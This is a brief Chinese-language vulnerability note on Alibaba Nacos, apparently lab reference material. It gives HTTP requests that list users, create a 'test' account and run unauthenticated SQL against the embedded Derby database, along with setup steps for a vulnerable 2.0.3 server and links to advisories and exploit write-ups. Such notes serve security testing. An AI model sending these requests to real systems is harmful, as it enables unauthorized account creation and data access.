### 查看用户
```
GET /nacos/v1/auth/users?pageNo=1&pageSize=100
```

### 创建用户
```
POST /nacos/v1/auth/users?username=test&password=test123
```

### unauth
```
/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
```

> These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql)

- https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
- https://www.cnblogs.com/hack404/p/14697313.html



## 安装
https://github.com/alibaba/nacos/releases/download/2.0.3/nacos-server-2.0.3.zip
```
unzip -q nacos-server-2.0.3.zip
bin/startup.sh -m standalone
```

![image](https://user-images.githubusercontent.com/30398606/173304250-3c57144d-6b7b-4291-bc31-473c07cf504b.png)


## 参考
- [Nacos结合Spring Cloud Gateway RCE利用](https://xz.aliyun.com/t/11493)
- [Nacos Client Yaml反序列化漏洞分析](https://xz.aliyun.com/t/10355)
- https://github.com/google/tsunami-security-scanner-plugins/issues/118
- https://github.com/google/tsunami-security-scanner-plugins/issues/119
- [云原⽣组件Nacos新型红队手法研究](https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ)
